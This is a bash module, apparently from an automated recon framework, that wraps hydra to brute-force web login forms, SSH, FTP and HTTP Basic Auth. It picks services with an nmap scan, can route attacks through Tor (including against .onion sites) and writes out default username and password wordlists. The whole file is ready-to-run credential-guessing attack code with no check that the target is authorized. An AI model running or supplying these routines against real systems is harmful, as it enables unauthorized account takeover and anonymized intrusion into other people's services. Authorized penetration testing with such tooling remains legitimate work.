#!/bin/bash

###############################################################################################################
# Brute Integration Module  
# Integrates brute force capabilities from 1N3/Brute
# Based on https://github.com/1N3/Brute
###############################################################################################################

# Install Brute if not present
function install_brute() {
    local install_dir="${tools}/Brute"
    
    if [[ -d "$install_dir" ]]; then
        printf "%b[✓] Brute is already installed%b\n" "$bgreen" "$reset"
        return 0
    fi
    
    printf "%b[*] Installing Brute...%b\n" "$bblue" "$reset"
    
    # Clone Brute repository
    if git clone --depth 1 https://github.com/1N3/Brute.git "$install_dir" 2>>"$LOGFILE"; then
        printf "%b[✓] Brute repository cloned%b\n" "$bgreen" "$reset"
    else
        printf "%b[!] Failed to clone Brute repository%b\n" "$bred" "$reset"
        return 1
    fi
    
    # Setup Brute
    cd "$install_dir" || return 1
    
    # Make brute.sh executable
    if [[ -f "brute.sh" ]]; then
        chmod +x brute.sh
        printf "%b[✓] Brute setup complete%b\n" "$bgreen" "$reset"
    else
        printf "%b[!] brute.sh not found in repository%b\n" "$bred" "$reset"
        cd - >/dev/null
        return 1
    fi
    
    cd - >/dev/null
    return 0
}

# Brute force web login forms
function brute_web_login() {
    local target=$1
    local username=${2:-admin}
    local output_file="${3:-brute_login.txt}"
    
    if [[ ! "$BRUTE_ENABLED" == true ]]; then
        printf "%b[*] Brute force is disabled in configuration%b\n" "$yellow" "$reset"
        return 0
    fi
    
    local brute_dir="${tools}/Brute"
    if [[ ! -d "$brute_dir" ]]; then
        printf "%b[!] Brute not found, installing...%b\n" "$yellow" "$reset"
        install_brute || return 1
    fi
    
    printf "%b[*] Brute forcing web login on %s (username: %s)...%b\n" "$bblue" "$target" "$username" "$reset"
    
    # Prepare wordlist
    local wordlist="${BRUTE_WORDLIST:-${tools}/wordlists/passwords.txt}"
    if [[ ! -f "$wordlist" ]]; then
        printf "%b[!] Wordlist not found: %s%b\n" "$yellow" "$wordlist" "$reset"
        wordlist="/usr/share/wordlists/rockyou.txt"
        if [[ ! -f "$wordlist" ]]; then
            printf "%b[!] No suitable wordlist found%b\n" "$bred" "$reset"
            return 1
        fi
    fi
    
    # Use hydra for web form brute forcing
    if command -v hydra &> /dev/null; then
        local proxy_opts=""
        if [[ "$TOR_ENABLED" == true ]]; then
            proxy_opts="-S 127.0.0.1:9050"
        fi
        
        # Try common web form paths
        local forms=("login" "admin" "wp-login.php" "administrator" "auth")
        
        for form in "${forms[@]}"; do
            local full_target="$target/$form"
            printf "%b[*] Trying form: %s%b\n" "$bblue" "$full_target" "$reset"
            
            timeout 300 hydra $proxy_opts -l "$username" -P "$wordlist" \
                -t "${BRUTE_THREADS:-10}" \
                -w "${BRUTE_DELAY:-1}" \
                "$target" http-post-form \
                "/$form:username=^USER^&password=^PASS^:F=incorrect" \
                2>>"$LOGFILE" | tee -a "$output_file"
            
            if [[ ${PIPESTATUS[0]} -eq 0 ]]; then
                grep -i "password:" "$output_file" && {
                    printf "%b[✓] Credentials found!%b\n" "$bgreen" "$reset"
                    return 0
                }
            fi
        done
    else
        printf "%b[!] hydra not found, cannot perform web login brute force%b\n" "$yellow" "$reset"
    fi
    
    return 1
}

# Brute force SSH
function brute_ssh() {
    local target=$1
    local port="${2:-22}"
    local output_file="${3:-brute_ssh.txt}"
    
    if [[ ! "$BRUTE_ENABLED" == true ]]; then
        return 0
    fi
    
    # SSH brute forcing over Tor is extremely slow and often blocked
    if [[ "$TOR_ENABLED" == true ]]; then
        printf "%b[!] SSH brute forcing over Tor is not recommended (very slow)%b\n" "$yellow" "$reset"
        return 0
    fi
    
    printf "%b[*] Brute forcing SSH on %s:%s...%b\n" "$bblue" "$target" "$port" "$reset"
    
    local userlist="${BRUTE_USERLIST:-${tools}/wordlists/users.txt}"
    local passlist="${BRUTE_WORDLIST:-${tools}/wordlists/passwords.txt}"
    
    if ! command -v hydra &> /dev/null; then
        printf "%b[!] hydra not found%b\n" "$yellow" "$reset"
        return 1
    fi
    
    timeout 600 hydra -L "$userlist" -P "$passlist" \
        -t "${BRUTE_THREADS:-10}" \
        -w "${BRUTE_DELAY:-1}" \
        ssh://"$target":"$port" \
        2>>"$LOGFILE" | tee -a "$output_file"
    
    if grep -q "password:" "$output_file"; then
        printf "%b[✓] SSH credentials found!%b\n" "$bgreen" "$reset"
        return 0
    fi
    
    return 1
}

# Brute force FTP
function brute_ftp() {
    local target=$1
    local port="${2:-21}"
    local output_file="${3:-brute_ftp.txt}"
    
    if [[ ! "$BRUTE_ENABLED" == true ]]; then
        return 0
    fi
    
    printf "%b[*] Brute forcing FTP on %s:%s...%b\n" "$bblue" "$target" "$port" "$reset"
    
    local userlist="${BRUTE_USERLIST:-${tools}/wordlists/users.txt}"
    local passlist="${BRUTE_WORDLIST:-${tools}/wordlists/passwords.txt}"
    
    if ! command -v hydra &> /dev/null; then
        printf "%b[!] hydra not found%b\n" "$yellow" "$reset"
        return 1
    fi
    
    local proxy_opts=""
    if [[ "$TOR_ENABLED" == true ]]; then
        proxy_opts="-S 127.0.0.1:9050"
    fi
    
    timeout 600 hydra $proxy_opts -L "$userlist" -P "$passlist" \
        -t "${BRUTE_THREADS:-10}" \
        -w "${BRUTE_DELAY:-1}" \
        ftp://"$target":"$port" \
        2>>"$LOGFILE" | tee -a "$output_file"
    
    if grep -q "password:" "$output_file"; then
        printf "%b[✓] FTP credentials found!%b\n" "$bgreen" "$reset"
        return 0
    fi
    
    return 1
}

# Brute force HTTP Basic Auth
function brute_http_basic() {
    local target=$1
    local output_file="${2:-brute_http.txt}"
    
    if [[ ! "$BRUTE_ENABLED" == true ]]; then
        return 0
    fi
    
    printf "%b[*] Brute forcing HTTP Basic Auth on %s...%b\n" "$bblue" "$target" "$reset"
    
    local userlist="${BRUTE_USERLIST:-${tools}/wordlists/users.txt}"
    local passlist="${BRUTE_WORDLIST:-${tools}/wordlists/passwords.txt}"
    
    if ! command -v hydra &> /dev/null; then
        printf "%b[!] hydra not found%b\n" "$yellow" "$reset"
        return 1
    fi
    
    local proxy_opts=""
    if [[ "$TOR_ENABLED" == true ]]; then
        proxy_opts="-S 127.0.0.1:9050"
    fi
    
    timeout 600 hydra $proxy_opts -L "$userlist" -P "$passlist" \
        -t "${BRUTE_THREADS:-10}" \
        -w "${BRUTE_DELAY:-1}" \
        "$target" http-get \
        2>>"$LOGFILE" | tee -a "$output_file"
    
    if grep -q "password:" "$output_file"; then
        printf "%b[✓] HTTP credentials found!%b\n" "$bgreen" "$reset"
        return 0
    fi
    
    return 1
}

# Brute force common services
function brute_common_services() {
    local target=$1
    local output_dir="${2:-brute_results}"
    
    if [[ ! "$BRUTE_ENABLED" == true ]]; then
        return 0
    fi
    
    mkdir -p "$output_dir"
    
    printf "%b[*] Brute forcing common services on %s...%b\n" "$bblue" "$target" "$reset"
    
    # Check which services are available
    local services=()
    
    # For .onion services, we typically only have HTTP/HTTPS
    if [[ "$target" =~ \.onion$ ]]; then
        printf "%b[*] Target is .onion, focusing on web services%b\n" "$bblue" "$reset"
        brute_web_login "$target" "admin" "$output_dir/web_login.txt"
        brute_http_basic "$target" "$output_dir/http_basic.txt"
        return 0
    fi
    
    # For regular targets, check multiple services
    if command -v nmap &> /dev/null; then
        printf "%b[*] Scanning for services...%b\n" "$bblue" "$reset"
        local ports=$(nmap -p22,21,80,443,3306,5432,1433,27017 --open -oG - "$target" 2>/dev/null | grep "/open/" | awk '{print $2}' | tr '\n' ',')
        
        if [[ "$ports" =~ 22 ]]; then
            brute_ssh "$target" 22 "$output_dir/ssh.txt"
        fi
        
        if [[ "$ports" =~ 21 ]]; then
            brute_ftp "$target" 21 "$output_dir/ftp.txt"
        fi
        
        if [[ "$ports" =~ 80|443 ]]; then
            brute_web_login "$target" "admin" "$output_dir/web_login.txt"
            brute_http_basic "$target" "$output_dir/http_basic.txt"
        fi
    else
        # Without nmap, just try web services
        brute_web_login "$target" "admin" "$output_dir/web_login.txt"
        brute_http_basic "$target" "$output_dir/http_basic.txt"
    fi
}

# Main brute force integration function
function brute_full_attack() {
    local target=$1
    local output_base="${2:-.}"
    
    if { [[ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ]] || [[ $DIFF == true ]]; } && [[ $BRUTE_ENABLED == true ]] && [[ $SPRAY == true ]]; then
        start_func "${FUNCNAME[0]}" "Running brute force attacks"
        
        mkdir -p "$output_base/brute"
        
        # Run brute force attacks
        brute_common_services "$target" "$output_base/brute"
        
        end_func "Brute force results saved in $output_base/brute/" "${FUNCNAME[0]}"
    else
        if [[ $BRUTE_ENABLED == false ]] || [[ $SPRAY == false ]]; then
            printf "\n%b[%s] %s skipped due to configuration settings.%b\n" "$yellow" "$(date +'%Y-%m-%d %H:%M:%S')" "${FUNCNAME[0]}" "$reset"
        else
            printf "%b[%s] %s has already been processed. To force execution, delete:\n    %s/.%s %b\n\n" "$yellow" "$(date +'%Y-%m-%d %H:%M:%S')" "${FUNCNAME[0]}" "$called_fn_dir" "${FUNCNAME[0]}" "$reset"
        fi
    fi
}

# Setup default wordlists
function setup_brute_wordlists() {
    local wordlist_dir="${tools}/wordlists"
    mkdir -p "$wordlist_dir"
    
    # Create basic user list if not exists
    if [[ ! -f "$wordlist_dir/users.txt" ]]; then
        cat > "$wordlist_dir/users.txt" <<EOF
admin
administrator
root
user
test
guest
manager
webmaster
support
info
service
operator
supervisor
moderator
EOF
    fi
    
    # Create basic password list if not exists
    if [[ ! -f "$wordlist_dir/passwords.txt" ]]; then
        cat > "$wordlist_dir/passwords.txt" <<EOF
admin
password
123456
12345678
qwerty
abc123
monkey
1234567
letmein
trustno1
dragon
baseball
111111
iloveyou
master
sunshine
ashley
bailey
passw0rd
shadow
123123
654321
superman
qazwsx
michael
football
EOF
    fi
    
    printf "%b[✓] Brute force wordlists ready%b\n" "$bgreen" "$reset"
}

# Export functions
export -f install_brute
export -f brute_web_login
export -f brute_ssh
export -f brute_ftp
export -f brute_http_basic
export -f brute_common_services
export -f brute_full_attack
export -f setup_brute_wordlists
